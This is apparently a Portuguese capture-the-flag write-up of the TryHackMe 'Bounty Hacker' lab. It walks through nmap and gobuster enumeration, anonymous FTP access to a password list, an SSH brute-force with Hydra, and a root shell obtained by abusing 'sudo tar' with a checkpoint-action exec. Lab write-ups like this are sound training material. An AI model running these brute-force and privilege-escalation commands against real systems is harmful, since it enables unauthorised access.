# Bounty Hacker Writeup

> [!NOTE] 
> **[EN]** This version of the writeup is in portuguese. Click [here]() or follow [this link (github)]() to go to the english version.

> **Link para o desafio CTF**: [https://tryhackme.com/room/cowboyhacker](https://tryhackme.com/room/cowboyhacker)
> **Dificuldade:** `Fácil`
> **Data de Resolução:** `2026/04/05`
## Sumário

> Link do writeup no github: [https://github.com/Luke0133/offsec-ctf/blob/main/CTFs/Bounty%20Hacker/(PT-BR)%20BountyHacker%20Writeup.md](https://github.com/Luke0133/offsec-ctf/blob/main/CTFs/Bounty%20Hacker/(PT-BR)%20BountyHacker%20Writeup.md)

- [Ferramentas Utilizadas](#ferramentas%20utilizadas)
- [Resolução do CTF](#Resolução%20do%20CTF)
	1. [Reconhecimento](#Reconhecimento)
	2. [Exploração](#Exploração)
	3. [Escalação de Privilégios](#Escalação%20de%20Privilégios)
- [Conclusão](#Conclusão)
- [Referências](#Referências)

## Ferramentas Utilizadas

Para este CTF, foram utilizadas as seguintes ferramentas a seguir:
- [Nmap](https://nmap.org/)[^nmap]: ferramenta de exploração da internet, criada para escanear rapidamente redes de larga escala. O Nmap realiza diversas requisições para um IP para determinar quais hosts estão disponíveis naquela rede, quais serviços que eles oferecem (por exemplo, HTTP, ssh, ...), quais sistemas operacionais (e versões destes) estão utilizando dentre outras informações. Sendo uma ferramenta poderosa para a enumeração de serviços e fornecimento de informações básicas sobre os hosts de uma rede, dados essenciais para alguém que está tentando invadir um sistema, o Nmap é muito utilizado em situações de pentesting e geralmente faz parte do primeiro passo nos CTFs.
- [Gobuster](https://github.com/OJ/gobuster)[^gobuster]: ferramenta responsável por enumerar por força bruta diretórios e arquivos, detectar subdomínios DNS e hosts virtuais, dentre outras funções. Por ser de alta performance, o Gobuster é essencial para agilizar o processo de encontrar diretórios de sistemas, poupando o desgaste da pessoa invasora de procurá-los manualmente, sendo, portanto recomendado para CTFs e pentesting.
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)[^hydra]: ferramenta de quebra de login que suporta diversos protocolos, dentre eles o SSH. Essa ferramenta torna possível mostrar o quão fácil pode ser ganhar acesso remoto a um sistema sem a devida autorização. A hydra é, portanto, uma ótima ferramenta para descobrir a senha em sistemas e pode testar várias senhas, dado um arquivo, permitindo assim uma força bruta com senhas mais comuns, por exemplo, sendo bem útil também para contextos de CTFs, em que o arquivo com senhas para testar pode estar escondido no sistema. 

Bem como recursos como:
- [GTFOBins](https://gtfobins.org/)[^gtfo]:  lista de executáveis estilo Unix que permitem ultrapassar restrições de segurança em sistemas vulneráveis, muito útil para realizar escalação de privilégio. Assim como o site anterior, contém um compilado de funções para várias situações.


## Resolução do CTF

O CTF Bounty Hacker, disponível no TryHackMe, é um desafio de dificuldade fácil que requer a exploração de um sistema por meio da obtenção de arquivos a partir de uma conexão ftp e o descobrimento por força bruta de uma chave de ssh a fim de obter acesso de usuário e escalar privilégios. São apenas duas flags (usuário e root) mas o próprio CTF contém outras perguntas para auxiliar na busca delas.

Após conectar-me ao VPN do TryHackMe, obtive acesso à maquina e iniciei o desafio. A estratégia usada foi dividida em duas partes:

1. [Reconhecimento](#Reconhecimento)
2. [Exploração](#Exploração)
3. [Escalação de Privilégios](#Escalação%20de%20Privilégios)
### Reconhecimento

A primeira coisa que fiz para o reconhecimento da máquina-alvo foi uma enumeração da rede com o `nmap`[^nmap], executando:

```sh 
nmap -T4 -A <TARGET_IP>  
```

em que `-T4` representa o template de temporização (de 0 a 5, quanto maior, mais rápido, ou seja, mais interações e menos discrição, o que não costuma ser um problema em CTFs básicos) e `-A` habilita a detecção de SO, detecção de versão, traceroute e scan de scripts. Dados relevantes da enumeração estão a seguir:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-03 08:27 EDT
Host is up (0.15s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.221.44
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d5:b5:77:12:55:d0:bf:8a:63:ff:83:ec:16:cd:ee:28 (RSA)
|   256 ee:06:19:eb:77:fd:59:3c:ae:72:46:dc:da:e8:4b:eb (ECDSA)
|_  256 60:76:fc:cd:12:58:8c:b1:b7:52:f2:d2:26:0f:87:b4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

em que percebi que o sistema era baseado em Apache, com as portas 21, 22 e 80 abertas (ftp, ssh e http). Como o serviço http estava disponível, decidi explorá-lo em primeiro lugar, como fiz até agora nos últimos CTFs. Todavia, enquanto eu abria a página web, já decidi executar um comando no `gobuster`[^gobuster], para adiantar a enumeração de diretórios:

```sh
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<TARGET_IP>/ -x php,html,txt -t 50
```

Este comando busca os diretórios com a wordlist fornecida (`-w`, com uma wordlist média contendo uma lista de diretórios mais comuns), no url fornecido (`-u`) e com as extensões fornecidas (`-x`, em que coloquei as mais comuns como php, html e txt), na quantidade de threads fornecida (`-t`, e, mais uma vez, discrição não é essencial nesse CTF, então o número escolhido foi alto para agilizar o processo). O resultado final obtido foi o seguinte:

```sh
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.67.177.241/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 315] [--> http://<TARGET_IP>/images/]
/index.html           (Status: 200) [Size: 969]
/javascript           (Status: 301) [Size: 319] [--> http://<TARGET_IP>/javascript/]
```

Os resultados finais dessa enumeração serão discutidos durante a fase de exploração, pois comecei a exploração ao mesmo tempo que executei o `gobuster`[^gobuster].

### Exploração

Ao acessar a página inicial (index.html), me deparei com a seguinte tela:

![pagina inicial](bh_index.png)

A tela inicial em si não continha nenhuma informação relevante, fornece o contexto do CTF de uma forma amigável. Procurei no código fonte da página para ver se havia algo interessante e não achei nada, apenas um trecho indicando um diretório de imagens, mas lá apenas havia a imagem `crew.jpg`:

```html
<div class='img-container'>
	<img src="/images/crew.jpg" tag alt="Crew Picture" style="width:1000;height:563">
</div>
```

Com os resultados do `gobuster`[^gobuster] prontos, percebi que realmente não havia mais nada para explorar (o diretório `/javascript` era restrito). Com isso, decidi explorar outros serviços estavam abertos, escolhendo assim o ftp, dado que ainda não tinha informações relevantes para tentar usar o ssh.

O ftp[^ftp], ou File Transfer Protocol é um padrão de comunicação que é usado justamente para a transferência de arquivos, como o nome diz. Caso o servidor for configurado para isso, é possível acessar de forma anônima (usando, geralmente, o usuário `anonymous`), sem haver a necessidade de senha. Geralmente no caso de poder acessar de forma anônima, apenas arquivos públicos deveriam ser disponibilizados, mas como vi nesse CTF, é possível que arquivos importantes sejam esquecidos no modo anônimo. Acessando o ftp, encontrei o seguinte:

```
ftp <TARGET_IP>              
Connected to <TARGET_IP>.
220 (vsFTPd 3.0.5)
Name (<TARGET_IP>:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

O arquivo `task.txt` continha a resposta à pergunta no TryHackMe "Who wrote the task?", no caso "lin":

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

O arquivo `locks.txt` continha várias palavras:

```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

Essas strings claramente pareciam uma lista de senhas, possivelmente de um usuário com nome "lin", que eu poderia usar no ssh. Antes de tentar, conferi usando o `nmap`[^nmap] que realmente o ssh suportava senhas como método de autenticação. O comando consistia em testar na porta 22 (`-p 22`, a porta em que o ssh estava aberto) métodos de autenticação para o ssh (usando o script `ssh-auth-methods`[^authmethods]) e com um nome aleatório como "username" para o usuário:

``` bash
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=username" <TARGET_IP> 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-05 16:29 EDT
Nmap scan report for <TARGET_IP>
Host is up (0.15s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password

Nmap done: 1 IP address (1 host up) scanned in 7.98 seconds
```

Com isso, vi que senhas eram suportadas pelo ssh. Apesar de ser possível receber uma resposta falsa caso o usuário não exista, fazia sentido mesmo assim testar as strings fornecidas no `locks.txt` para tentar entrar com um usuário. Para isso usei do seguinte comando com o `hydra`[^hydra]:

```bash
hydra -l lin -P ~/locks.txt ssh://<TARGET_IP>
```

Esse comando essencialmente testa o login (`-l`) para um usuário "lin" com o arquivo contendo senhas (`-P`) `locks.txt` no serviço ssh do ip dado. O resultado que obtive foi:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-05 16:43:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://<TARGET_IP>/
[22][ssh] host: <TARGET_IP>   login: lin   password: <PASSWORD>
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-05 16:43:59
```

Com isso, eu sabia que o usuário "lin" tinha a senha `<PASSWORD>` e poderia agora tentar acessar com o ssh. No terminal, digitei:

```
$ ssh lin@<TARGET_IP>                    
lin@<TARGET_IP>'s password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228
```

E, assim, obtive acesso ao terminal do usuário "lin" e encontrei a flag no mesmo diretório:

```
lin@ip-<TARGET_IP>:~/Desktop$ whoami
lin
lin@ip-<TARGET_IP>:~/Desktop$ ls
user.txt
lin@ip-<TARGET_IP>:~/Desktop$ cat user.txt
<USER_FLAG>
```

### Escalação de Privilégios

Por fim, era necessário escalar privilégios e encontrar a flag em `/root`. Para isso, testei no terminal as permissões do usuário:

```
$ sudo -l
lin@ip-<TARGET_IP>:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-<TARGET_IP>:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-<TARGET_IP>:
    (root) /bin/tar
```

Com isso, descobri que o usuário "lin" tinha acesso privilegiado caso executasse o comando `tar`, usado geralmente para a compressão de arquivos. Dessa forma, eu pude executar o seguinte comando na shell, fornecido pelo site GTFObins[^gtfo]:

```
$ lin@ip-<TARGET_IP>:~/Desktop$ sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# whoami
root
```

E, assim, obtive acesso ao root, encontrando a flag de root em `/root/root.txt`:

```
# cd /root
# ls
root.txt  snap
# cat root.txt
<ROOT_FLAG>
```

finalizando, então o CTF.
## Conclusão

O CTF Bounty Hacker permitiu explorar os serviços ssh e ftp, encontrando arquivos sensíveis disponibilizados para qualquer usuário anônimo e utilizando de força bruta para encontrar a senha correspondente a um usuário e ganhar acesso ao seu terminal. Com isso a busca pelas flags foi bem direta, encontrando os arquivos `user.txt` e `root.txt`, após aproveitar de uma vulnerabilidade causada pela permissão total de comandos `tar` a nível de super user. No caso desse CTF, era possível nem explorar o site disponível pelo http, mas comecei por lá seguindo a minha checklist, pois era melhor garantir que não havia nada antes de partir para outros serviços (fora que o http é o serviço que mais explorei nos últimos CTFs).
## Referências

[^nmap]: Nmap: [https://nmap.org/](https://nmap.org/)
[^gobuster]: Gobuster: [https://github.com/OJ/gobuster](https://github.com/OJ/gobuster)
[^hydra]: Hydra: [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
[^gtfo]: GTFOBins: [https://gtfobins.org/](https://gtfobins.org/)
[^ftp]: Sobre FTP: [https://en.wikipedia.org/wiki/File_Transfer_Protocol](https://en.wikipedia.org/wiki/File_Transfer_Protocol)
[^authmethods]: Sobre detecção de métodos de autenticação de ssh com nmap: [https://nmap.org/nsedoc/scripts/ssh-auth-methods.html](https://nmap.org/nsedoc/scripts/ssh-auth-methods.html)